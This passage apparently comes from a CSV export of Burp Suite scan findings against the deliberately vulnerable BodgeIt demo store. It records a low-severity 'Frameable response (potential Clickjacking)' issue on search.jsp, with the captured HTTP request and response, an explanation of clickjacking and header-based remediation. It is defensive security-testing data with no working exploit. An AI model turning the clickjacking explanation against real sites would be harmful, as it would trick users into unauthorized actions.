</html>","<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p> <p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using ""framebusting"" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p> <p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>","<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>","","",""
"DemoApps","","Bodgeit","62","Frameable response (potential Clickjacking)","","Info","Open","2015-10-15","Burp Suite Pro","693","Protection Mechanism Failure","","/bodgeit/search.jsp","","","http://localhost:8080/bodgeit/search.jsp","","GET /bodgeit/search.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2216 Date: Mon, 28 Mar 2016 20:11:18 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Search</h3> <font size=""-1""> <FORM name='query' method='GET'> <table> <tr><td>Search for</td><td><input type='text' name='q'></td></td> <tr><td></td><td><input type='submit' value='Search'/></td></td> <tr><td></td><td><a href='advanced.jsp' style='font-size:9pt;'>Advanced Search</a></td></td> </table> </form> </font> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p> <p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using ""framebusting"" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p> <p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>","<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>","","",""
